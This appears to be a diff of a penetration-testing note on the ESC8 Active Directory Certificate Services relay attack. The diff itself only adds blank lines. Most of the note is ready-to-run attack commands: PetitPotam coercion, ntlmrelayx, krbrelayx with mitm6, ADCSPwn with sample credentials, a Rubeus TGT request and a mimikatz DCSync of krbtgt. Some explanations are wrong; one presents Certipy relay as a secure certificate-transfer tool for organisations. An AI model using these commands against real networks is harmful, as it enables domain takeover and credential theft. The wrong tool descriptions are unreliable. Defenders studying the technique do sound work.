@@ -39,6 +39,8 @@ This attack involves relaying authentication requests to an Active Directory Cer
 
 This attack involves relaying authentication requests to an Active Directory Certificate Services (AD CS) server using the NTLM Relay technique with Rubeus and PetitPotam. The attacker can then acquire a valid certificate from the AD CS server using the compromised user's credentials. This can be used to impersonate the user and perform actions such as signing malware or accessing sensitive information encrypted with the user's certificate. This attack can also be used to elevate privileges by acquiring a certificate for a privileged account.
 
+ 
+
 ## Requirements
 
 1. Access to a network with an AD CS server
@@ -46,6 +48,8 @@ This attack involves relaying authentication requests to an Active Directory Cer
 1. NTLM Relay tool such as Rubeus
 
 1. PetitPotam tool
+
+ 
 
 ## Defense
 
@@ -55,6 +59,8 @@ This attack involves relaying authentication requests to an Active Directory Cer
 
 1. Monitor for abnormal certificate issuance or usage
 
+ 
+
 ## Objectives
 
 1. Acquire a valid certificate from the AD CS server using the compromised user's credentials
@@ -62,6 +68,8 @@ This attack involves relaying authentication requests to an Active Directory Cer
 1. Impersonate the user and perform actions such as signing malware or accessing sensitive information encrypted with the user's certificate
 
 1. Elevate privileges by acquiring a certificate for a privileged account
+
+ 
 
 # Instructions
 
@@ -72,9 +80,17 @@ This attack involves relaying authentication requests to an Active Directory Cer
 4. Use the certificate with Rubeus to request a TGT by running the command 'Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt' or 'Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt'.
 5. Finally, use the TGT to perform a DCSync by running the command 'mimikatz> lsadump::dcsync /user:krbtgt'.
 
+ 
+
+
+
 **Code**: [[impacket> python3 ntlmrelayx.py -t http://<ca-serv]]
 
+
+
 > This command is used to perform NTLM Relay attacks using Rubeus and PetitPotam. The command provides instructions on how to use NTLM Relay, Rubeus and PetitPotam to coerce authentication via MS-ESFRPC EfsRpcOpenFileRaw function and then use the obtained TGT to perform a DCSync. The command also explains the arguments of the commands used and provides examples of the commands.
+
+
 
 **Command** ([[Coerce authentication via MS-ESFRPC EfsRpcOpenFileRaw function with petitpotam]]):
 
@@ -84,6 +100,10 @@ python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
 python3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP
 ```
 
+
+
+
+
 **Command** ([[Use the certificate with rubeus to request a TGT]]):
 
 ```bash
@@ -91,11 +111,17 @@ Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
 Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzC...mUUXS /ptt
 ```
 
+
+
+
+
 **Command** ([[Use the TGT to perform a DCSync]]):
 
 ```bash
 mimikatz> lsadump::dcsync /user:krbtgt
 ```
+
+
 
 2. To acquire domain controller hashes, follow the below steps:
 1. Run the following command in Impacket to relay NTLM authentication to the target server:
@@ -108,14 +134,26 @@ tgt::ask /pfx:<BASE64-CERT-FROM-NTLMRELAY> /user:dc$ /domain:lab.local /ptt
 4. Finally, in Mimikatz, execute the following command to dump domain controller hashes:
    lsadump::dcsync /user:krbtgt
 
+ 
+
+
+
 **Code**: [[impacket> python3 ./examples/ntlmrelayx.py -t http]]
+
+
 
 > This command is used to acquire domain controller hashes in order to perform further attacks. The steps involve relaying NTLM authentication to the target server, establishing a connection with the domain controller, requesting a TGT ticket and finally dumping domain controller hashes using Mimikatz. The acquired hashes can be used to perform Pass-the-Hash (PtH) attacks.
 
 3. Follow the below instructions to perform a Kerberos Relay Attack with mitm6:
 
+ 
+
+
+
 **Code**: [[# Setup the relay
 sudo krbrelayx.py --target http:]]
+
+
 
 > 1. First, set up the relay by running the following command:
 
@@ -129,11 +167,17 @@ sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA
 
 This command will perform the Kerberos Relay Attack and allow the attacker to gain access to the target machine.
 
+
+
 **Command** ([[Setup the Kerberos Relay]]):
 
 ```bash
 sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine
 ```
+
+
+
+
 
 **Command** ([[Run mitm6]]):
 
@@ -141,12 +185,22 @@ sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.dom
 sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v
 ```
 
+
+
 4. To use ADCSPwn, run the `adcspwn.exe` executable with the appropriate arguments. The `--adcs` argument specifies the address of the AD CS server which authentication will be relayed to. The `--port` argument sets the port ADCSPwn will listen on. The `--remote` argument specifies the remote machine to trigger authentication from. The `--username` and `--password` arguments are used for non-domain context. The `--dc` argument specifies the domain controller to query for Certificate Templates (LDAP). The `--unc` argument sets a custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam). The `--output` argument specifies the output path to store the generated certificate in base64 format.
+
+ 
+
+
 
 **Code**: [[https://github.com/bats3c/ADCSPwn
 adcspwn.exe --ad]]
 
+
+
 > ADCSPwn is a tool for performing an Active Directory Certificate Services (AD CS) relay attack. The tool requires the `WebClient` service to be running on the domain controller, which is not installed by default. The tool is used to relay authentication from a remote machine to the AD CS server. The tool supports several arguments, including specifying the AD CS server address, port, and remote machine to trigger authentication from. The `--username` and `--password` arguments are used for non-domain context. The `--dc` argument specifies the domain controller to query for Certificate Templates (LDAP). The `--unc` argument sets a custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam). The `--output` argument specifies the output path to store the generated certificate in base64 format.
+
+
 
 **Command** ([[ADCSPwn relay attack]]):
 
@@ -158,17 +212,29 @@ adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\Temp\cer
 adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\mranderson --password The0nly0ne! --dc dc.pwnlab.local
 ```
 
+
+
 5. To configure Certipy Relay with CA IP address, run the following command:
+
+ 
+
+
 
 **Code**: [[certipy relay -ca 172.16.19.100]]
 
+
+
 > This command configures the Certipy Relay with the IP address of the Certificate Authority (CA). The -ca argument specifies the IP address of the CA. The Certipy Relay is a tool that allows for the secure transfer of certificates between systems. By configuring it with the CA IP address, it can establish a secure connection with the CA and transfer certificates securely. This command is useful for organizations that need to manage a large number of certificates and need a secure way to transfer them between systems.
+
+
 
 **Command** ([[Generate Relay Certificate]]):
 
 ```bash
 certipy relay -ca 172.16.19.100
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -198,3 +264,5 @@ certipy relay -ca 172.16.19.100
 - [[Active Directory Attacks]]
 - [[Active Directory Certificate Services]]
 - [[ESC8 - AD CS Relay Attack]]
+
+
